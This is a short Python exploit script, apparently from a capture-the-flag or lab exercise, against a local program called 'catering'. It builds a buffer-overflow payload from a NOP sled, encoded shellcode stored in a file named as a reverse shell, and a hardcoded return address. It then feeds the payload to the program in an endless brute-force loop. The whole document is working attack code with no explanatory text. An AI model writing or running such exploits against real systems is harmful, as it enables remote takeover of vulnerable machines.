import subprocess
import time
import sys

def run_catering(counter):
    print(f"Attempt number {counter}")
    process = subprocess.Popen(["./catering", "./reverse_shell.txt"])

def save_payload(payload):
    with open("./reverse_shell.txt", "wb") as f:
        f.write(payload)

def create_payload():
    buf =  b""
    buf += b"\xbd\x24\x01\x20\xbf\xdb\xca\xd9\x74\x24\xf4\x5b"
    buf += b"\x2b\xc9\xb1\x15\x31\x6b\x14\x83\xc3\x04\x03\x6b"
    buf += b"\x10\xc6\xf4\x11\x64\x6c\xe0\x09\x57\xf0\x3f\x71"
    buf += b"\x90\x13\x6c\xc6\x0c\xb9\x91\x41\x53\x8d\xf0\x9c"
    buf += b"\x14\x7e\xa5\xae\x2a\x4d\xd6\x86\x2d\xb4\xbf\x12"
    buf += b"\xce\x44\x45\x4b\xcc\x48\x54\xec\x59\xa9\xe6\x94"
    buf += b"\x09\x78\x54\xea\xa9\xf3\xbb\xc1\x2e\x51\x54\xb4"
    buf += b"\x01\x26\xcc\x20\x71\xe7\x6e\xd8\x04\x14\x3c\x49"
    buf += b"\x9e\x3b\x71\x66\x6d\x3b\x43\xa2\x07\x3a\xfc\x99"
    buf += b"\x58"

    payload = b'A,2,' + b'\x90'*(140-len(buf)) + buf
    payload += b'\x90\x90\x90\x90\x90\x90\x90\x90' + b"\x20\xb6\xda\xff"
    return payload

def main():
    counter = 0
    while True:
        payload = create_payload()
        save_payload(payload)
        run_catering(counter)
        counter += 1

if __name__ == "__main__":
    main()